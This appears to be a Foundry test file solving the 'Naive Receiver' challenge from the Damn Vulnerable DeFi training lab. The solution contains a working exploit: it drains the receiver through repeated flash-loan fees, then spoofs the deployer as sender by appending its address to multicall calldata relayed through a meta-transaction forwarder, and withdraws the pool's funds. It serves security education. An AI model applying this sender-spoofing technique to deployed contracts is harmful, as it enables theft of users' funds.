// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {

        // we can trigger a flashloan in the receiver contract, since the fee is 1 WETH and the contract balance is 10 WETH we can do this 10 times (using multicall) to get all those funds in the pool
        // Then we just need to make sure that we can get the funds out of the pool and to the recovery address
        // we can do this by adding 1 more transaction to the multicall, which would fake a withdrawal from the deployer by adding the deployer's address in the last 20 bytes of the call. This will make the _msgSender() function
        // think that this tx comes from the deployer, which has deposited all the funds here so we can withdraw them all to the recovery account

        // call flashloan for receiver 10 times
        // @todo do this using multicall, use abi.encodeCall
        bytes[] memory calldatas = new bytes[](11);

        for(uint256 i = 0; i < 10; i++){
            calldatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 1, bytes("")));
        }

        bytes20 deployerbytes = bytes20(address(deployer));

        // add withdraw to the calldatas
        calldatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (1010 ether, payable(recovery))), deployerbytes);


        // @todo request should be created for multicall tx alltogether!
        bytes memory allCalldata = abi.encodeCall(pool.multicall, calldatas);

        // Step 1: Create request
        BasicForwarder.Request memory req = BasicForwarder.Request({
            from: player,
            target: address(pool), // we call this contract as target
            value: 0,
            gas: 10_000_000,
            nonce: 0,
            data: allCalldata,
            deadline: block.timestamp + 1 hours
        });

       
        bytes32 request = keccak256(
            abi.encodePacked("\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(req))
        );

        // Step 3: Sign it using Foundry cheatcodes
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, request);
        bytes memory signature = abi.encodePacked(r, s, v);

        // Step 4: Call the forwarder
        bool success = forwarder.execute{value: 0}(req, signature);

        assertTrue(success);
        
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
